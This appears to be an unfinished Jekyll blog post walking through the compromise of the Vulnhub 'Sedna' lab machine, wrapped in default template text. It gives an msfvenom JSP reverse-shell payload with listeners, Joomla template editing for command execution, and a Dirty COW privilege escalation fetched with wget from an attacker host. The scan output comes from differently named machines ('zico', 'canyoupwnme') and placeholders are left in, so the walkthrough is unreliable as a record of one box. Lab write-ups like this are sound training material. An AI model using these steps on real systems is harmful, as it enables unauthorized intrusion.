---
layout: post
title:  "Sedna: Vulnhub Walkthrough"
date:   2019-08-02 15:07:19
categories: [tutorial]
comments: true
---
You’ll find this post in your `_posts` directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run `jekyll serve`, which launches a web server and auto-regenerates your site when a file is updated.

To add new posts, simply add a file in the `_posts` directory that follows the convention `YYYY-MM-DD-name-of-post.ext` and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.

<!--more-->
## Information Gathering
We'll start with an nmap `scan`:

```
nmap -sV -O -p- -oN /root/oscp/exam/zico/zico.nmap zico
Nmap scan report for zico (192.168.109.128)
Host is up (0.0011s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
111/tcp   open  rpcbind 2-4 (RPC #100000)
35613/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:FD:3A:40 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 22 15:30:34 2018 -- 1 IP address (1 host up) scanned in 15.74 seconds

```

Just a spoiler there are several ways to get a shell on this box. I'll show you below. There are several http ports open. 
We shall enumerate all of them http ports using dirb.

dirb http://192.168.175.135
This doesn't give much

## Method One: Tomcat

Navigating to http://192.168.175.135:8080 shows that its running a tomcat server. We'll bruteforce for any hidden directories or simply try `/manager` as its common on tomcat

dirb http://192.168.175.135:8080
```
URL_BASE: http://192.168.175.135:8080/
---- Scanning URL: http://192.168.175.135:8080/ ----
==> DIRECTORY: http://192.168.175.135:8080/docs/
==> DIRECTORY: http://192.168.175.135:8080/examples/
==> DIRECTORY: http://192.168.175.135:8080/host-manager/
+ http://192.168.175.135:8080/index.html (CODE:200|SIZE:1895)
==> DIRECTORY: http://192.168.175.135:8080/manager/
==> DIRECTORY: http://192.168.175.135:8080/META-INF/

```

... and what do you know
Going to the manager link
`http://192.168.175.135:8080/manager`
asks for a password. We do have a file that has a passwords for Tomcat servers. We try some default passwords. If not we can try to brute-force using hydra;

#### Insert hydra command here;
We'll use 
username: tomcat 
password:tomcat

and we're in. 
### Insert image here.

Now we know tomcat runs java hence jsp hence we'll use this to generate a payload;
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.227.135 LPORT=80 -f war > rs.war
```
On the attackers box we can either use msfconsole or nc as follows

### Start a listener in msfconsole
```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 10.11.0.250; set LPORT 80; set ExitOnSession false; exploit -j"
```
### Start a nc listener
```
nc -lnvp 80
```
## Method Two: Joomla

We'll follow the same drill. Port 8081 is running Joomla, hence we'll bruteforce for any hidden directories.
dirb http://192.168.175.135:8081 
```
URL_BASE: http://192.168.175.135:8081/
---- Scanning URL: http://192.168.175.135:8081/ ----
==> DIRECTORY: http://192.168.175.135:8081/administrator/
==> DIRECTORY: http://192.168.175.135:8081/cache/
+ http://192.168.175.135:8081/cgi-bin/ (CODE:403|SIZE:292)
==> DIRECTORY: http://192.168.175.135:8081/components/
==> DIRECTORY: http://192.168.175.135:8081/images/
==> DIRECTORY: http://192.168.175.135:8081/includes/
+ http://192.168.175.135:8081/index.php (CODE:200|SIZE:4047)
==> DIRECTORY: http://192.168.175.135:8081/javascript/
==> DIRECTORY: http://192.168.175.135:8081/language/
==> DIRECTORY: http://192.168.175.135:8081/libraries/
==> DIRECTORY: http://192.168.175.135:8081/logs/
==> DIRECTORY: http://192.168.175.135:8081/media/
==> DIRECTORY: http://192.168.175.135:8081/modules/
==> DIRECTORY: http://192.168.175.135:8081/phpmyadmin/
==> DIRECTORY: http://192.168.175.135:8081/plugins/
+ http://192.168.175.135:8081/robots.txt (CODE:200|SIZE:304)
+ http://192.168.175.135:8081/server-status (CODE:403|SIZE:297)
==> DIRECTORY: http://192.168.175.135:8081/templates/
==> DIRECTORY: http://192.168.175.135:8081/tmp/
==> DIRECTORY: http://192.168.175.135:8081/xmlrpc/

```
Another thing we can do is use Joomscan to further enumerate
`joomscan -u http://192.168.175.135:8081`

### iNSERT image
Reading through the log we find that `#15` holds something useful. A  vulnerability exists that allows users to change admin password;

### Insert image

We reset the password and log in;

Once we in as admin. We look for a php file we can edit. To do this;
1. go to Extensions
2. Template Manager
3. Selec the active template
4. Edit the template and save changers.

Once this is done we can execute commands through  the browser. 
As usual we'll use Burp to intercept and execute the payload;

## Other interests
This box is also running `Samba` and we can see from the smb enum script, we can Read/Write into the $IPC Service

```
Host script results:                                                      
| smb-enum-shares:                                                   
|   account_used: guest                                                   
|   IPC$:                                                                 
|     Type: STYPE_IPC_HIDDEN                                              
|     Comment: IPC Service (canyoupwnme server (Samba, Ubuntu))           
|     Users: 1                                                            
|     Max Users: <unlimited>                                              
|     Path: C:\tmp                                                        
|     Anonymous access: READ/WRITE                                        
|     Current user access: READ/WRITE


``` 

## Post Exploitation

```
uname -a
Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
```
From this kernel version we can attempt a kernel exploit.
It may crash the system but we'll still try it.
We'll attempt to use the dirtycow exploit.
####Add link to dirtycow
```
wget http://192.168.175.132:1234/cowroot.c -O /tmp/cowroot.c
Edit it for either 32bit or 64bit.


python -c "import pty; pty.spawn('/bin/bash');"
gcc -pthread cowroot.c -o cowroot && chmod 744 cowroot && ./cowroot asdf
Once you get a shell enter the following command. chap chap
echo 0 > /proc/sys/vm/dirty_writeback_centisecs

```
Other way is to use the suid bit set.

Check out the [Jekyll docs][jekyll] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll’s dedicated Help repository][jekyll-help].

[jekyll]:      http://jekyllrb.com
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-help]: https://github.com/jekyll/jekyll-help
